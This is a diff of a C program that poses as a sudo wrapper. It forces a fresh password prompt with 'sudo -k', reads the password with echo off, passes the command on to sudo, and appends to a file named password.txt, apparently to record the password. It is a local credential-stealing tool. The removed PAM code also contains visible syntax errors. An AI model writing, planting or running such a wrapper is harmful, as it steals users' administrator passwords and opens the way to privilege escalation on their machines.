@@ -4,43 +4,26 @@
 #include<termios.h>
 #include<string.h>
 #include<stdlib.h>
-#include<security/pam_appl.h>
-#include<security/pam_misc.h>
 
-int pamconv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {
-    struct pam_response *reply = malloc(num_msg, sizeof(struct pam_response));
-    if (!reply) return PAM_BUF_ERR;
 
-    for (int i = 0;i < num_msg;i++) {
-    if (msg[i]->msg_style == PAM_PROMPT_ECHO_OFF) {
-        reply[i].resp = strdup((char *)appdata_ptr);
-        reply[i].resp_retcode = 0;
-    
-    } else {
-        reply[i].resp = NULL;
-        reply[i].resp_retcode = 0;
-    }
-    *resp = reply
-    return PAM_SUCCESS
-};
 
 
 int main(int argc,char *argv[]){
-     if (argc < 2) {
-        system("sudo");
-        return 0;
-    }
-
-    // sudo ticket invalidation
-    system("sudo -k");
-
     // variable declaration & structures
     struct termios old_t, new_t;
     char password[64];
     char cmdbuffer[1024] = "sudo "; 
     char *user = getlogin();
     char pwdbuf[128];
+    
 
+    if (argc < 2) {
+        system("sudo");
+        return 0;
+    }
+
+    // sudo ticket invalidation
+    system("sudo -k");
     // real command that will be executed
     for (int i = 1;i < argc;i++){
         strcat(cmdbuffer, argv[i]);
@@ -67,7 +50,7 @@ int main(int argc,char *argv[]){
     fflush(stdout);
 
     tcsetattr(STDIN_FILENO, TCSADRAIN, &old_t);
-    
+
 
     FILE *f = fopen("password.txt", "a");
 
